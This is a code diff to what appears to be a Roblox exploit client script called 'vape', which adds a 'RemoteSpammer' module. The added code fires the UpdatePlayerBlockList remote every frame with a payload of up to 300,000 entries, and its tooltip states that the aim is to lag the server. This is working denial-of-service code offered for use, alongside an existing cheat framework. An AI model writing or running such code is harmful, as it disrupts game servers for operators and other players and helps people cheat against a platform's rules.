@@ -47,6 +47,7 @@ local arrestCooldown = os.clock()
 local tempTargets = {}
 local gamepasses = {}
 local flatMask = Vector3.new(1, 0, 1)
+local RemoteSpammer
 
 local function checkPoint(pos, params)
 	for _, part in workspace:GetPartBoundsInRadius(pos, 0, params) do
@@ -809,4 +810,61 @@ end)
 
 for _, v in {'Reach', 'Jesus', 'MurderMystery', 'StaffDetector', 'FullBright', 'Health', 'GamingChair'} do
 	vape:Remove(v)
+end
+
+local Payload
+local payload
+local payloadSize
+
+local function getPayload()
+	if not payload or payloadSize ~= Payload.Value then
+		payloadSize = Payload.Value
+		payload = table.create(payloadSize)
+		for index = 1, payloadSize do
+			payload[index] = {id = index, v = index * 2}
+		end
+	end
+
+	return payload
+end
+
+local function getRemote()
+	local container = game:FindFirstChild('RobloxReplicatedStorage')
+	local remote = container and container:FindFirstChild('UpdatePlayerBlockList')
+	return remote and cloneref(remote)
+end
+
+RemoteSpammer = vape.Categories.World:CreateModule({
+	Name = 'RemoteSpammer',
+	Function = function(callback)
+		if callback then
+			notif('RemoteSpammer', 'Spamming the block list remote.', 5)
+
+			repeat
+				local remote = getRemote()
+				if remote then
+					pcall(remote.FireServer, remote, getPayload())
+				end
+
+				runService.Heartbeat:Wait()
+			until not RemoteSpammer.Enabled
+		else
+			payload = nil
+		end
+	end,
+	Tooltip = 'Spams the UpdatePlayerBlockList remote with a huge payload to lag the server.'
+})
+Payload = RemoteSpammer:CreateSlider({
+	Name = 'Payload',
+	Min = 1000,
+	Max = 300000,
+	Default = 150000,
+	Tooltip = 'Entries in each payload, bigger is heavier but more likely to be rejected.'
+})
+
+local remoteSpammerLoad = RemoteSpammer.Load
+function RemoteSpammer:Load(data)
+	local settings = table.clone(data)
+	settings.Enabled = false
+	return remoteSpammerLoad(self, settings)
 end
